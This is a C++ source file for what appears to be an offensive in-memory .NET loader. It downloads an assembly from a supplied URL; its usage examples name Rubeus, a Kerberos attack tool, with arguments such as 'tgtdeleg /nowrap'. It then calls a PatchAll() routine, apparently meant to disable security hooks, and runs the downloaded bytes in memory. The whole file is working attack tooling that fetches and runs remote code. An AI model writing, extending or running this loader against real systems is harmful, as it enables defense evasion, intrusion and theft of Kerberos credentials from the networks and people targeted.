#include "http.hpp"
#include "execute_assembly.hpp"
#include "patchs.hpp"
#include <iostream>
#include <string>
#include <regex>
#include <vector>


void printHelp(const std::string& exe)
{
    std::cout << "Usage:\n";
    std::cout << "  " << exe << " --url <http://host:port/path> [--tls] [--]\n\n";
    std::cout << "Options (must appear before \"--\"):\n";
    std::cout << "  --url   Full URL (http or https)\n";
    std::cout << "  --tls   Enable HTTPS/TLS if present (default: off)\n";
    std::cout << "  --help  Show this help\n\n";
    std::cout << "Everything after \"--\" is passed verbatim as extra args.\n\n";
    std::cout << "Examples:\n";
    std::cout << "  " << exe << " --url http://127.0.0.1:8000/rubeus.exe\n";
    std::cout << "  " << exe << " --url https://example.com/rubeus.exe --tls\n";
    std::cout << "  " << exe << " --url http://localhost/rubeus.exe -- klist\n";
    std::cout << "  " << exe << " --url https://127.0.0.1/rubeus.exe -- tgtdeleg /nowrap\n";
}


int main(int argc, char* argv[])
{
    if (argc < 2)
    {
        printHelp(argv[0]);
        return 1;
    }

    std::string url;
    std::vector<std::string> extraArgs;
    bool useTls = false;

    for (int i = 1; i < argc; ++i)
    {
        std::string arg = argv[i];

        if (arg == "--")
        {
            for (int j = i + 1; j < argc; ++j)
            {
                extraArgs.emplace_back(argv[j]);
            }
            break;
        }
        else if (arg == "--help" || arg == "-h")
        {
            printHelp(argv[0]);
            return 0;
        }
        else if (arg == "--url")
        {
            if (i + 1 >= argc)
            {
                std::cerr << "Missing value for --url\n";
                return 1;
            }
            url = argv[++i];
        }
        else if (arg == "--tls")
        {
            useTls = true;
        }
        else
        {
            std::cerr << "Unknown option: " << arg << "\n";
            return 1;
        }
    }

    if (url.empty())
    {
        std::cerr << "Missing required argument: --url\n";
        return 1;
    }

    std::regex re(R"(https?://([^/:]+)(?::(\d+))?(/.*)?)");
    std::smatch match;

    if (!std::regex_match(url, match, re))
    {
        std::cerr << "Invalid URL: " << url << "\n";
        return 1;
    }

    std::string host = match[1].str();
    std::string portStr = match[2].matched ? match[2].str() : (useTls ? "443" : "80");
    std::string path = match[3].matched ? match[3].str() : "/";

    int port = std::stoi(portStr);

    std::cout << "(debug)--> host = " << host << std::endl;
    std::cout << "(debug)--> port = " << port << std::endl;
    std::cout << "(debug)--> path = " << path << std::endl;
    std::cout << "(debug)--> useTls = " << (useTls ? "true" : "false") << std::endl;

    if (!extraArgs.empty())
    {
        std::cout << "(debug)--> extraArgs:\n";
        for (size_t k = 0; k < extraArgs.size(); ++k)
        {
            std::cout << "  [" << k << "] " << extraArgs[k] << "\n";
        }
    }

    Client hClient(host, port, useTls);

    std::string httpResponse = hClient.Get(path);

    const std::vector<uint8_t> responseBytes(httpResponse.begin(), httpResponse.end());
    const std::vector<std::string> args(extraArgs.begin(), extraArgs.end());

    std::cout << "(debug)--> responseBytes.size() = "
        << responseBytes.size() << std::endl;
    std::string out;
    BOOL ok;

    PatchAll();

    ok = ExecuteAssembly(
        out,
        responseBytes,
        extraArgs
    );

    std::cout << out;
    return 0;
}
